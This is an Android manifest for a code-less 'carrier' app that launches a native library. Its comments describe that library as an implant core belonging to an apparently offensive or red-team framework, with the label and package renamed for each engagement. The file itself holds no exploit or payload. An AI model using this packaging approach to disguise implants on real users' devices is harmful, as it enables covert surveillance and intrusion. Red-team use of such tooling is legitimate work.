<?xml version="1.0" encoding="utf-8"?>
<!-- The carrier app's whole face (architecture.md Sec 12.2, the mobile
     reach leg): no Java, no resources. The framework's own NativeActivity
     loads librod_carrier.so and the implant core runs in-process. The
     build unit packages this manifest with the compiled cdylib through
     aapt2/apksigner; the package id and label are the lab shape an
     engagement renames at packaging time (operations/android.md), and the
     debuggable flag keeps the core's stderr diagnostics in logcat for the
     lab (the engagement shape clears it). hasCode=false is what lets the
     package carry no classes.dex at all. -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="rod.carrier">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="34"/>

    <application
        android:label="Rod"
        android:debuggable="true"
        android:hasCode="false"
        android:extractNativeLibs="false">

        <activity
            android:name="android.app.NativeActivity"
            android:label="Rod"
            android:exported="true"
            android:configChanges="orientation|keyboardHidden|screenSize|screenLayout|smallestScreenSize">
            <meta-data android:name="android.app.lib_name" android:value="rod_carrier"/>
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
